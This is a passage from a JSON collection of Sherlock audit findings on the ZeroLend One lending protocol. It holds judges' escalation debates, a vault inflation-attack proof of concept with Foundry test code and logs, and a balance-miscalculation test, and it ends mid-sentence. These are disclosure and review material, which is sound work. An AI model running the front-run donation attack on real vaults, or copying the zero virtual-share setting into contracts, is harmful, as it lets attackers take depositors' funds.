issue because the protocol works exactly how it's meant to. \n\nWhen removing a pool, the curator should reallocate the assets of the pool into a different pool before removing it. If this correct order is followed, the issue does not arise.\n\nNow the watson has stated in the comments (not the original report) that there are some cases where pool managers are malicious and freeze reserves so reallocation is not possible. In that case, if the pool is malicious, its irrational for curators to add the same pool back after removing it. So again, the issue won't occur. \n\nFurthermore, if they know the freezing is going to be temporary, then they wouldn't remove the funds from the pool in the first place. If they do so, it's incorrect actions by the vault curator causing harm to vault depositors.\n\n\n**0xNirix**\n\nThe above comment trying to invalidate the issue is incorrect. In fact, the curator would want to re-add the pool, once pool becomes available again, so as to recover the funds. Moreover, freezing and unfreezing reserves isn't necessarily indicative of malicious behavior; it can be part of normal operational procedures or some requirements (e.g. regulatory) for pool owners.\n\n**Honour-d-dev**\n\n@0xNirix \nFreezing reserves does not prevent withdrawals though, you can check the [executeWithdraw](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/logic/SupplyLogic.sol#L123) and [validateWithdraw](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/logic/ValidationLogic.sol#L96) functions, freeing only prevents supply.\nSo claims relying on freezing are invalid in this case.\n\nIf a pool is so compromised that it cannot be withdrawn from, then it doesn't makes sense for it to be added again. If it's a temporary compromise then the pool can just be shifted to be bottom of the withdraw queue (there's a functionality for this), instead of removing and loosing users funds. _**normal operational procedures**_ (as claimed in the above comment) should not be reason for removing a pool without properly reallocating funds since these are obviously temporary\n\n**0xNirix**\n\n> If a pool is so compromised that it cannot be withdrawn from, then it doesn't makes sense for it to be added again\n\nMy point is that you as a curator still want to add the pool back to recover your funds when (and if) the pool becomes withdraw-able again. You can anyways restrict any new deposit from going to the pool, so you only expect to gain back the funds. Please remember curator does not control pool's manager action and cannot guess whether it is a temporary or permanent change.\n\n\n**Honour-d-dev**\n\n> My point is that you as a curator still want to add the pool back to recover your funds when (and if) the pool becomes withdraw-able again.\n\nPool funds not being withdrawable does not mean it's compromised, and does not require drastic actions (e.g. removal) that risks users funds, lack of liquidity ( due to borrowing) can make a pool temporarily un-withdrawable. In this case the pool can be moved to the bottom of the withdraw queue until it has liquidity.\n\nVault admins are expected to know this and act rationally\n\n**0xNirix**\n\nI think we are going in a bit of circles here, but please allow me to frame the argument again:\nIt does not matter if the pool is compromised or not, or vault curator would be able to ascertain whether it is a temporary or permanent situation (which they can not always due to lack of control on pool owners actions, and vault curators have a limit on pools they can keep around in the withdraw queue).\nIn any case, including the compromised pool case, if and when the vault owner sees an opportunity to get back the funds by re-adding the pool, they must do the re-addition. They would want to withdraw back their funds and can limit any further deposit. \n\nThat is precisely why the code exists in the first place in the addition flow, that explicitly adds back the account assets from the pool. There is even a comment saying no fee should be charged from these assets because you do not want to charge a fee on the entire principal that was lost (fees are only charged on interests). This further indicates an intentional and conscious re-addition of funds, where the vulnerability lies.\n\n```solidity\n       // Take into account assets of the new market without applying a fee.\n        pool.forceUpdateReserve(asset());\n        uint256 supplyAssets = pool.supplyAssets(asset(), positionId);\n        _updateLastTotalAssets(lastTotalAssets + supplyAssets);\n```\n\n\n**Honour-d-dev**\n\nMy point is that curators can be trusted to not remove pools with user funds unless there is a security risk involved for the vault itself (i.e. vault can be exploited via pool) , in which case the pool cannot be re-added due to said security risk.\n\nAny other inconvenience can be fixed by reallocating the funds before removal or rearranging the withdraw queue.\n\nThe code is safely accounting for funds as donations are always possible \n\n**0xNirix**\n\n> My point is that curators can be trusted to not remove pools with user funds unless there is a security risk involved for the vault itself (i.e. vault can be exploited via pool) , in which case the pool cannot be re-added due to said security risk.\n\nAbsolutely my point as well, the re-addition applies to the compromised pools as well. Even if there was a security risk, that may get possibly resolved in future. Pease note the pools can be upgradeable according to Zerolend docs. \n\n> Any other inconvenience can be fixed by reallocating the funds before removal or rearranging the withdraw queue.\n\nIncorrect, like I mentioned in my previous comment, vault curators have a limit on pools in the withdraw queue and they may not be able to keep waiting by parking pools in withdraw queue for pool owner to take some action.\n\n> The code is safely accounting for funds as donations are always possible\n\nThe whole vulnerability is that the code infact fails to safely add funds while re-adding,  whether they are donations or past deposits.\n\n**Honour-d-dev**\n\n>Absolutely my point as well, the re-addition applies to the compromised pools as well. Even if there was a security risk, that may get possibly resolved in future\n\nCan you please provide a valid example of such a \"compromise\" that would cause a curator to remove a pool and re-added later.\nI believe you are yet to mention anything specific, besides freezing reserves, which is invalid.\n\n>Incorrect, like I mentioned in my previous comment, vault curators have a limit on pools in the withdraw queue and they may not be able to keep waiting by parking pools in withdraw queue for pool owner to take some action.\n\nThis situation is very unlikely (even acknowledged by you, previously) that at at best only 1 or 2 pools can be experiencing it at any point in time. \"parking pools\" is obviously a stretch \n\n**0xNirix**\n\nI was merely responding to your previous comment \n\n> My point is that curators can be trusted to not remove pools with user funds unless there is a security risk involved for the vault itself (i.e. vault can be exploited via pool) , in which case the pool cannot be re-added due to said security risk.\n\nEven in these cases, you may want to add back the pool when the security risk gets resolved e.g. via upgrade.\n\n> This situation is very unlikely (even acknowledged by you, previously) that at at best only 1 or 2 pools can be experiencing it at any point in time. \"parking pools\" is obviously a stretch\n\nI don't see any of my comment saying this is unlikely. Anyways, even if  1 or 2 pools are impacted, they can still cause this issue if the vault is already running close to the withdraw queue limit which is rather small (30). \n\nAt this point of time, I think this exchange is not making progress and converging and we are repeating same set of arguments. Will wait for HoJ to step in.\n\n**cvetanovv**\n\nI agree with @0xNirix points.\n\nThe re-addition of a pool, even after encountering issues, is possible. Vault curators don’t have control over pool manager actions, so re-adding a previously removed pool when it becomes withdrawable again is also possible.\n\nWhen pools are removed and then re-added, this vulnerability emerges due to the way assets are immediately accounted for. This means that there is a real edge case for this attack to happen without the curator making a mistake.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**0xSpearmint**\n\n@cvetanovv This issue is invalid.\n\nThe issue requires that the curator removes a pool **WITHOUT** reallocating all the assets out of it. This makes 0 sense to do since the vault is forfeiting all the depositors assets in that pool. Pools with assets should never be removed temporarily, there is no valid reason to do so.\n\nEven if the pool is somehow compromised, the curator should first try to reallocate any funds out of the pool and then set the cap to 0 to prevent further deposits but still allow withdrawals from that pool.\n\nThe report describes a scenario where the vault curator makes a mistake that causes fund loss to vault depositors, which is not a valid issue.\n\n\n\n**0xNirix**\n\nAll the points in above comment have already been discussed in this thread. Please do not repeat arguments just trying to invalidate the issue.\n\n> Even if the pool is somehow compromised, the curator should first try to reallocate any funds out of the pool and then set the cap to 0 to prevent further deposits but still allow withdrawals from that pool.\n\nReally? \nAs a curator, you would definitely not want to keep a  pool which is compromised (and may have any vulnerability including in the withdrawal path) attached to your vault in any way.\nIn fact, you would remove it right away and see if the pool owner can potentially resolve it and then re-add the pool so that you can get back your funds, once it is safe.\n\n\n\n\n\n**Honour-d-dev**\n\nThe reason I believe this issue is invalid is because under current pool and vault implementation there's no valid **compromise** that would require a pool to be removed without reallocating funds and then re-added later\n\n@0xNirix has not been able to provide a valid situation where such a process is the only solution.\nThe reason for that is obviously because such a situation does not exist and the entire issue is based on a hypothetical unspecified **compromise** \n\nOf course @0xNirix can provide a plausible example if there is one.\n\n**0xNirix**\n\nThis is amusing. First you guys yourselves bring up \"compromise\" scenarios that according to you are feasible but does not apply here, trying to invalidate the issue. The ones where you think it may warrant removal of pool with assets but no re-addition or even no removal in the first place, and when I counter that even in such conditions you may have to remove and re-add, you go back and ask where is the scenario?\n\nLet me clarify for one last time what I have already mentioned clearly in my comments earlier. My stand from day one has been that it is perfectly feasible for a curator to remove pools with assets for both non-compromised or compromised scenarios. One such scenario I had mentioned was when the pool may be non-withdrawable for a long time as no repayments are done. Pool owner may further aggravate this situation by freezing assets so no more deposits can come. Curator does not know if repayments will ever come or if pool owner will ever remove freeze to allow more deposits. They may take a rational decision to write off this bad debt for the moment. This is a standard practice that is done by even physical banks. Why? Because you do not want to impact your new depositors when you know with whatever information you have that part of your assets may not be returned. Otherwise you risk lowering their final yield by socializing old losses with new depositors, eventually discouraging new vault depositors. However, in this particular case, vault has a real limitation that will force curator to remove such pools with assets from the withdraw queue even earlier. This because a vault can only keep limited (up to 30 pools) in its withdraw queue, so if a vault is running near its capacity of 30 pools and even one pool has some issues they may be forced to take such call sooner than later. Now, if the pool owner decides to allow deposits again, curator will see a chance to get their funds back and hence would want to re-add the pool. This is just one scenario but all the compromise scenarios that you thought do not apply but are feasible are actually applicable too and there is real risk of vault losing funds because of this vulnerability in many such scenarios overall.\n\nWill wait for HoJ to take a final call.\n\n\n\n\n\n**Honour-d-dev**\n\n@0xNirix it is your report that first mentions an **issue** but fails to provide a valid example as we see here\n> **Isn't it impossible to add a market with existing funds?**\nA: No, it's actually possible and even anticipated in two scenarios:\nReintegrating a previously removed market with leftover funds, e.g. A market removed due to an **_issue_**, but not all funds were withdrawn.\n\n> My stand from day one has been that it is perfectly feasible for a curator to remove pools with assets for both non-compromised or compromised scenarios\n\nNo rational curator would remove a pool for non-compromised scenarios, this is because users who withdraw before the pool is re-added would definitely suffer a loss and waiting for the pool to be re-added is not an option as they don't know when it'll be added or if it ever will be. \nPool removal with leftover funds is a **last resort solution** due to this reason and should not be taken lightly\n\n> One such scenario I had mentioned was when the pool may be non-withdrawable for a long time as no repayments are done. Pool owner may further aggravate this situation by freezing assets so no more deposits can come. Curator does not know if repayments will ever come or if pool owner will ever remove freeze to allow more deposits. They may take a rational decision to write off this bad debt for the moment. \n\nThis scenario is invalid, if a pool is non-withdrawable due to lack of funds, even if the pool owner freezes the asset repayments will still be possible because freezing does not affect repayments. In this scenario a rational curator will simply reorder the withdraw queue and wait for those repayments instead of removing the market and costing users their funds. \n\nIt is very obvious that currently this issue has no possible scenario, and also obvious that it cannot be medium severity\n\n\n**0xNirix**\n\n@Honour-d-dev, please read my entire comment. I have clearly explained why it may be necessary and rational for a curator to remove a pool rather than simply reorder it.\n\n@cvetanovv, I apologize for this late request, but upon further consideration, I believe this issue should be upgraded to **High**. The impact of this issue is very similar to issue #233, which was judged high, where a pool owner could maliciously set incorrect interest rates causing withdrawals to revert. Eventually, a curator would reasonably consider such funds lost and remove the pool. They would need to remove such failing pools from their withdrawal queues for the reasons I explained in https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2432814025: to prevent losses to the new depositors and/or due to withdrawal queue limitations. Later, the pool owner could correct the interest rate, and the curator would want to re-add the pool to the vault. However, the pool owner would then execute this attack from a different wallet. The impact would be identical - loss of vault funds that were in the pool, and the pool owner could even claim they have no malicious intent.\n\n**Honour-d-dev**\n\n> @Honour-d-dev, please read my entire comment. I have clearly explained why it may be necessary and rational for a curator to remove a pool rather than simply reorder it.\n\nI read your comment, I believe the 30 pool limit is not a valid reason either. Reordering to preserve users funds if possible should have more priority over adding new pools. If a pool already has 30 pools in it and one is temporarily non-withdrawable, surely there're 29 other working pools, no?\n\n> a pool owner could maliciously set incorrect interest rates causing withdrawals to revert. Eventually, a curator would reasonably consider such funds lost and remove the pool. They would need to remove such failing pools from their withdrawal queues for the reasons I explained in https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2432814025: to prevent losses to the new depositors and/or due to withdrawal queue limitations. Later, the pool owner could correct the interest rate, and the curator would want to re-add the pool to the vault.\n\nThis example is also invalid , a rational curator would never re-add a pool with a malicious pool owner that can set incorrect interest rates, whether they choose to correct the rates or not. The security risks are vey obvious from adding such a pool.\n\n@cvetanovv This issue does not even meet medium severity, i think it's obvious at this point that there is no valid scenario where such a thing is the only **rational** choice, judging by how difficult it is for @0xNirix to provide one.\n\n**There are only 2 possible cases here**\n1. if a pool/pool admin is malicious and cannot be withdrawn from, it should be removed and never re-added (it makes no sense to re-add a malicious pool even if it appears to be  working correctly)\n2. If the pool is not compromised but temporarily non-withdrawable it should be reordered instead of removed ( because removing might still cost some users their funds an i stated [here](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2433201858))\n\n**0xNirix**\n\nHere we go again in circles!\n\n> I read your comment, I believe the 30 pool limit is not a valid reason either. Reordering to preserve users funds if possible should have more priority over adding new pools. If a pool already has 30 pools in it and one is temporarily non-withdrawable, surely there're 29 other working pools, no?\n\nPlease stop replying to only part of the argument. I will just repeat - please re-read the entire comment again to see why curator may rationally decide to remove a pool.\n\n> This example is also invalid , a rational curator would never re-add a pool with a malicious pool owner that can set incorrect interest rates, whether they choose to correct the rates or not. The security risks are vey obvious from adding such a pool.\n\nProbably repeating this for the nth time as well - how does curator know that pool owner is malicious or simply made a mistake? \nAnd even if malicious pool owner, why not, if curator can very well ensure that there is no downside (because no new deposit would go to the pool) and there is only upside (can potentially get funds back).\n\n> if a pool/pool admin is malicious and cannot be withdrawn from, it should be removed and never re-added (it makes no sense to re-add a malicious pool even if it appears to be working correctly)\n> If the pool is not compromised but temporarily non-withdrawable it should be reordered instead of removed ( because removing might still cost some users their funds an i stated https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2433201858)\n\nI have given examples for both these cases with clear reasons on how a curator might end up removing and then re-adding pool. It should be pretty obvious that this is an High issue, given other similar judgements.\n\n**cvetanovv**\n\nThis issue is not High severity. To be High severity, we should not have any restrictions. Only the fact that the attack is only possible with certain curator actions makes this a Medium/Low severity. \n\nThe core of the issue lies in the lack of a clear mechanism to prevent sandwich attacks when adding or re-adding pools with existing funds.\n\nThere are a few scenarios where re-adding a previously removed pool—either compromised or non-withdrawable due to temporary liquidity constraints. And the curators can’t control pool management actions. Attackers could exploit the updated asset-share ratio post-addition to profit at the expense of existing users.\n\nGiven these factors, I agree that this is a valid concern and can be Medium severity.\n\n**WangSecurity**\n\nResult:\nMedium\nUnique\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143/#issuecomment-2391978988): rejected",
      "summary": "\nThis bug report discusses a vulnerability in a financial system where malicious actors can take advantage of the immediate addition of assets from a new or re-added market. This can lead to a significant financial loss for existing users as attackers can execute a \"sandwich attack\" to profit from changes in the asset-share ratio. The root cause of this vulnerability is the immediate update of total assets when adding or re-adding a market with existing assets. This issue was found by a user named 0xNirix.\n\nThe report includes a discussion between different users about the severity of this issue. Some argue that it is not a valid issue because it requires the curator to remove a pool without reallocating all the assets, which is not a rational action. However, others point out that there are scenarios where a curator may have to remove a pool with assets, such as when the pool is compromised or non-withdrawable for a long time. In these cases, the curator may want to re-add the pool later when the issue is resolved. The report concludes that this vulnerability is a medium or low severity issue because it can only be exploited under certain conditions. However, it also highlights the need for a clear mechanism to prevent sandwich attacks when adding or re-adding pools with existing funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143",
      "tags": [],
      "finders": [
        "0xNirix"
      ]
    },
    {
      "id": "41823",
      "title": "M-2: CuratedVaults are prone to inflation attacks due to not utilising virtual shares",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/141 \n\n## Found by \n0xMax1mus, A2-security, Bauchibred, BiasedMerc, Jigsaw, Oblivionis, Obsidian, TessKimy, iamnmt\n## Summary\nAn attacker can frontrun a user's deposit transaction in a new vault pool position, stealing 100% of the depositors underlying token deposit by causing no shares to be minted to the user. This is caused by inflating the value of the shares to cause the user's underlying token deposit amount to round down to be worth 0 shares.\n\n## Vulnerability Detail\n[SharesMathLib.sol](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/libraries/SharesMathLib.sol#L32-L36)\n```solidity\nlibrary SharesMathLib {\n  using MathLib for uint256;\n...SKIP...\n  uint256 internal constant VIRTUAL_SHARES = 0;\n...SKIP...\n  uint256 internal constant VIRTUAL_ASSETS = 0;\n  ```\n\nThe [morpho version](https://github.com/morpho-org/morpho-blue/blob/731e3f7ed97cf15f8fe00b86e4be5365eb3802ac/src/libraries/SharesMathLib.sol) that this code is based on has these values set to non-zero, which allows them to be protected against vault inflation attacks. However ZeroLend One has these values set to `0` meaning the vault inflation protection are not in place.\n\n## POC\n<details>\n<summary>POC</summary>\nAdd the following code to the bottom of `IntegrationVaultTest::_setUpVault()`:\n\n```solidity\n    vm.startPrank(attacker);\n    loanToken.approve(address(vault), type(uint256).max);\n    collateralToken.approve(address(vault), type(uint256).max);\n    vm.stopPrank();\n\n    // ERC4626Test context address, as vm.startPrank does not change the context msg.sender in the test file\n    vm.startPrank(0x50EEf481cae4250d252Ae577A09bF514f224C6C4);\n    loanToken.approve(0xC8011cB77CC747B5F30bAD583eABfb522Be25712, type(uint256).max); // market where we will be sending donation\n    collateralToken.approve(0xC8011cB77CC747B5F30bAD583eABfb522Be25712, type(uint256).max);\n    vm.stopPrank();\n```\n\nDeclare the attacker address in `BaseVaultTest.sol` contract under the other addresses:\n\n```solidity\naddress internal attacker = makeAddr('attacker');\n```\n\nAdd the following function to `ERC4626Test.sol`:\n```solidity\n  function testVaultInflationAttack() public {\n    uint256 attackerAssets = 1e18+1;\n    uint256 attackerDonation = 1e18;\n    uint256 supplierAssets = 1e18;\n\n    loanToken.mint(attacker, attackerAssets);\n    loanToken.mint(supplier, supplierAssets);\n\n    /// attacker front-run supplier\n    loanToken.mint(0x50EEf481cae4250d252Ae577A09bF514f224C6C4, attackerDonation); // ERC4626Test context will perform the donation as vm.startPrank isn't changing msg.sender to attacker\n    allMarkets[0].supplySimple(address(loanToken), address(vault), attackerDonation, 0); // supply vault market position\n    console.log(\"attacker donates assets:\", attackerDonation);\n\n    vm.prank(attacker);\n    uint256 attackerShares = vault.deposit(attackerAssets, attacker);\n    console.log(\"attacker deposits underlying:\", attackerAssets);\n    console.log(\"attacker shares:\", attackerShares);\n    loanToken.mint(address(vault), 1e18); // same as attacker transfering, but having issue with foundry\n    // attacker donation\n    \n    /// supplier deposit transaction\n    vm.prank(supplier);\n    uint256 supplierShares = vault.deposit(supplierAssets, supplier);\n    console.log(\"supplier deposits underlying:\", supplierAssets);\n    console.log(\"supplier shares:\", supplierShares);\n\n    console.log(\"vault underlying:\", vault.totalAssets());\n    console.log(\"vault shares:\", vault.totalSupply());\n  }\n```\n</details>\n\n```solidity\nLogs:\n  attacker donates assets: 1000000000000000000\n  attacker deposits underlying: 1000000000000000001\n  attacker shares: 1\n  supplier deposits underlying: 1000000000000000000\n  supplier shares: 0\n  vault underlying: 3000000000000000001\n  vault shares: 1\n```\n\n## Impact\n\nAs seen from the POC logs the depositor is minted 0 shares, and the attacker controls the singular share of the vault allowing them to redeem the share and get back their `2e18+1` attack funds and `1e18` of the supplier's funds. This is a clear loss of funds due to an inflation attack, leading to a High risk vulnerability as each vault will be vulnerable to this risk due to not utilising the Morpho vault inflation protections.\n\n## Code Snippet\n\n[SharesMathLib.sol](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/libraries/SharesMathLib.sol#L32-L36)\n\n## Tool used\n\nFoundry and Manual Review\n\n## Recommendation\n\nUtilise the same values as Morpho for `VIRTUAL_SHARES` and `VIRTUAL_ASSETS`:\n```solidity\nlibrary SharesMathLib {\n    using MathLib for uint256;\n\n    /// @dev The number of virtual shares has been chosen low enough to prevent overflows, and high enough to ensure\n    /// high precision computations.\n    /// @dev Virtual shares can never be redeemed for the assets they are entitled to, but it is assumed the share price\n    /// stays low enough not to inflate these assets to a significant value.\n    /// @dev Warning: The assets to which virtual borrow shares are entitled behave like unrealizable bad debt.\n    uint256 internal constant VIRTUAL_SHARES = 1e6;\n\n    /// @dev A number of virtual assets of 1 enforces a conversion rate between shares and assets when a market is\n    /// empty.\n    uint256 internal constant VIRTUAL_ASSETS = 1;\n```\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  Invalid: misleading POC. Intentionally doesn't show attackers profit as it results in a loss of funds for attacker as well\n\n\n\n**nevillehuang**\n\nDECIMAL_OFFSETS and virtual shares work [hand in hand to combat first depositor inflation attacks](https://docs.openzeppelin.com/contracts/4.x/erc4626#defending_with_a_virtual_offset), so I personally believe they are duplicates and under a single category of issues. Additionally, even if offset is zero and virtual shares is implemented, it can already make the attack non-profitable, so I would say the root cause here is the lack of implementation of a virtual share\n\n> If the offset is greater than 0, the attacker will have to suffer losses that are orders of magnitude bigger than the amount of value that can hypothetically be stolen from the user.\n\n**Honour-d-dev**\n\nThis \"attack\" result in a loss for both attacker and victim... I don't believe it is valid because IRL no one would pull of an attack where they loose funds as well, it can't even count as griefing.\n\nAlso the PoC is incomplete and misleading by omitting the fact that there's a huge loss for the attacker as well\n\n**Honour-d-dev**\n\nEscalate\n\nper above comment\n\n**sherlock-admin3**\n\n> Escalate\n> \n> per above comment\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nAlthough the grief attack will also cause the malicious user to take losses, it is possible, and I think Medium severity is appropriate for this issue.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/141/#issuecomment-2392010510): rejected",
      "summary": "\n\nThis bug report discusses a vulnerability found in the CuratedVaults code that can be exploited by attackers to steal a user's deposit. The vulnerability is caused by the code not utilizing virtual shares, which are used to protect against inflation attacks. The report includes a proof of concept and recommendations for fixing the issue. The severity of the vulnerability is considered to be medium and it has been found to have duplicates. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/141",
      "tags": [],
      "finders": [
        "TessKimy",
        "0xMax1mus",
        "Oblivionis",
        "Obsidian",
        "Jigsaw",
        "BiasedMerc",
        "Bauchibred",
        "A2-security",
        "iamnmt"
      ]
    },
    {
      "id": "41822",
      "title": "M-1: Using the same heartbeat for multiple price feeds, causing DOS",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/9 \n\n## Found by \n000000, 0xAlix2, 0xAristos, 0xDemon, 0xMax1mus, 0xlrivo, A2-security, Bauchibred, EgisSecurity, HackTrace, Honour, Obsidian, aman, emmac002, iamnmt, perseus, sheep, theweb3mechanic, zarkk01\n### Summary\n\nChainlink price feeds usually update the price of an asset once it deviates a certain percentage. For example the ETH/USD price feed updates on 0.5% change of price. If there is no change for 1 hour, the price feed updates again - this is called heartbeat: https://data.chain.link/feeds/ethereum/mainnet/eth-usd.\n\nAccording to the docs, the protocol should be compatible with any EVM-compatible chain. On the other hand, different chains use different heartbeats for the same assets.\n\nDifferent chains have different heartbeats:\n\nUSDT/USD:\n* Linea: ~24 hours, https://data.chain.link/feeds/linea/mainnet/usdt-usd\n* Polygon: ~27 seconds, https://data.chain.link/feeds/polygon/mainnet/usdt-usd\n\nBNB/USD:\n* Ethereum: ~24 hours, https://data.chain.link/feeds/ethereum/mainnet/bnb-usd\n* Optimism: ~20 minutes, https://data.chain.link/feeds/optimism/mainnet/bnb-usd\n\nIn [`PoolGetters::getAssetPrice`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolGetters.sol#L158C12-L163), the protocol is using the same heartbeat for all assets/chains, which is 30 minutes.\n\nThis causes the protocol to regularly revert unexpectedly (DOS).\n\n### Root Cause\n\nThe same heartbeat is being used for all chains/assets, in `PoolGetters::getAssetPrice`.\n\n### Impact\n\nEither constant downtime leading to transactions reverting or insufficient staleness checks leading to the possibility of the old price.\n\n### PoC\n\n1. User calls `withdraw`, to withdraw his collateral (in USDT) from a certain pool on Linea\n2. The `withdraw` function calls other multiple functions leading to `GenericLogic::calculateUserAccountData` (which gets the price of an asset)\n3. The contract calls the Oracle USDT/USD feed on Linea\n4. At the moment the heartbeat check for every price feed on every chain is set to 30 minutes\n5. The price was not updated for more than 2 hours since the heartbeat for the pair is 24 hours and also not changed 1% in either direction\n6. The transaction reverts causing DoS\n\n### Mitigation\n\nIntroduce a new parameter that could be passed alongside the oracle which refers to the heartbeat of that oracle, so that `updatedAt` could be compared with that value.",
      "summary": "\nThis bug report is about a problem with using the same heartbeat for multiple price feeds in the Chainlink protocol. The protocol updates the price of an asset when it changes by a certain percentage, and if there is no change, it updates again after a set amount of time. However, different chains have different update times for the same assets, which can cause issues. The root cause is that the same heartbeat is being used for all chains and assets, leading to unexpected reverts and possible old prices being used. A potential solution is to introduce a new parameter that can be passed for each oracle, so that the update time can be compared and adjusted accordingly. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/9",
      "tags": [],
      "finders": [
        "perseus",
        "0xDemon",
        "0xAlix2",
        "iamnmt",
        "aman",
        "zarkk01",
        "0xMax1mus",
        "sheep",
        "000000",
        "emmac002",
        "EgisSecurity",
        "theweb3mechanic",
        "Obsidian",
        "0xAristos",
        "A2-security",
        "HackTrace",
        "Bauchibred",
        "Honour",
        "0xlrivo"
      ]
    },
    {
      "id": "41821",
      "title": "H-11: Wrong calculation of supply/debt balance of a position, disrupting core system functionalities",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473 \n\n## Found by \n000000, 0xAlix2, A2-security, BiasedMerc, Bigsam, DenTonylifer, Honour, JCN, JuggerNaut63, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\\_05, almurhasan, charlesjhongc, coffiasd, dany.armstrong90, denzi\\_, dhank, ether\\_sky, iamnmt, jah, joshuajee, lemonmon, neon2835, oxelmiguel, perseus, silver\\_eth, trachev\n## Summary\nThere is an error in the calculation of the supply/debt balance of a position, impacting a wide range of operations across the system, including core lending features.\n\n## Vulnerability Detail\n`PositionBalanceConfiguration` library have 2 methods to provide supply/debt balance of a position as follows:\n\n```solidity\n  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n    uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n>   return self.supplyShares + increase;\n  }\n\n  function getDebtBalance(DataTypes.PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {\n    uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);\n>   return self.debtShares + increase;\n  }\n```\n\nThe implementation contains a critical error as it returns the `share amount` rather than the `asset amount` held. This issue is evident when the function utilizes `index`, same as `self.lastSupplyLiquidityIndex` or `self.lastDebtLiquidityIndex`. Each function returns `self.supplyShares` and `self.debtShares`, which are share amounts, while the caller expects accurate asset balances. A similar issue occurs when a different index is used, still resulting in an incorrect balance that is significantly lower than the actual balance.\n\nBelow I provide a sample scenario to check supply balance (`getSupplyBalance` using same liquidity index):\n1. Suppose `position.lastSupplyLiquidtyIndex` = `2 RAY` (2e27)  (Time passed as the liquidity increased).\n2. Now position is supplied `2 RAY` of assets, it got `1 RAY` (2RAY.rayDiv(2RAY)) shares minted.\n3. Then `position.getSupplyBalance(2 RAY)` returns `1 RAY` while we expect `2 RAY` which is correct balance.\n\nBelow is a foundary PoC to validate one live example: failure to fully repay with type(uint256).max due to balance error. Full script can be found [here](https://gist.github.com/worca333/8103ca8527e918b4fc8ab06b71ac798a).\n```solidity\n  function testRepayFailWithUint256MAX() external {\n    _mintAndApprove(alice, tokenA, 4000 ether, address(pool));\n\n    // Set the reserve factor to 1000 bp (10%)\n    poolFactory.setReserveFactor(10_000);\n\n    // Alice supplies and borrows tokenA from the pool\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, 2000 ether, 0);\n    pool.borrowSimple(address(tokenA), alice, 800 ether, 0);\n\n    vm.warp(block.timestamp + 10 minutes);\n\n    assertGt(pool.getDebt(address(tokenA), alice, 0), 0);\n    vm.stopPrank();\n\n    // borrow again: this will update reserve.lastDebtLiquidtyIndex\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenA), alice, 20 ether, 0);\n    vm.stopPrank();\n\n    pool.forceUpdateReserve(address(tokenA));\n\n    console.log(\"Debt before repay: \", pool.getDebt(address(tokenA), alice, 0));\n    vm.startPrank(alice);\n    tokenA.approve(address(pool), UINT256_MAX);\n    pool.repaySimple(address(tokenA), UINT256_MAX, 0);\n    console.log(\"Debt after  repay: \", pool.getDebt(address(tokenA), alice, 0));\n\n    console.log(\"Assert: Debt still exists after full-repay with UINT256_MAX\");\n    assertNotEq(pool.getDebt(address(tokenA), alice, 0), 0);\n    vm.stopPrank();\n  }\n```\n\nRun the test by \n```bash\nforge test --mt testRepayFailWithUint256MAX -vvv\n```\n\nLogs:\n```bash\n[PASS] testRepayFailWithUint256MAX() (gas: 567091)\nLogs:\n  Debt before repay:  819999977330884982376\n  Debt after  repay:  929433690028148\n  Assert: Debt still exists after full-repay with UINT256_MAX\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.68ms (1.18ms CPU time)\n\nRan 1 test suite in 281.17ms (4.68ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n## Impact\nSince these functions are integral to the core pool/position logic and are utilized extensively across the system, the impacts are substantial.\n1. In `SupplyLogic.executeWithdraw`, withdrawl is processed based on wrong position 